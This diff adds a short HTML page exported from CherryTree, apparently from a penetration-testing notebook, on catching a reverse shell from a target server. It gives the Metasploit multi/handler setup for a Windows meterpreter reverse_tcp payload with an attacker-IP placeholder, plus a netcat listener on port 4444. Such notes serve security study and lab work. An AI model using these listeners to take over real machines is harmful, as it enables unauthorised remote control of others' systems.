@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3. listen for incoming connection from the Target Server</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>3. listen for incoming connection from the Target Server</h1><br/><br /><strong><h2>Listen for incoming connection from the Target Server </h2></strong><br /><br /><br /><strong>Meterpreter</strong><br /><div class="codebox"><pre>service postgresql start<br />msfdb init<br />msfconsole<br />use exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<br /><span style="color:#ff9d00;font-weight:700">set</span> payload windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp   <span style="color:#0088ff;font-weight:400">#for the exploit we have to set the same payload</span><br />                                              <span style="color:#0088ff;font-weight:400">#setted for the exe created with msfconsole</span><br />show options<br /><span style="color:#ff9d00;font-weight:700">set</span> LHOST &lt;Attacke_IP&gt;</pre></div><br /><br /><a href=""><img src="images/817-1.png" alt="images/817-1.png" /></a><br /><br /><br /><strong>Netcat</strong><br /><div class="codebox"><pre>nc -nvlp 4444</pre></div></div>
+</body>
+</html>
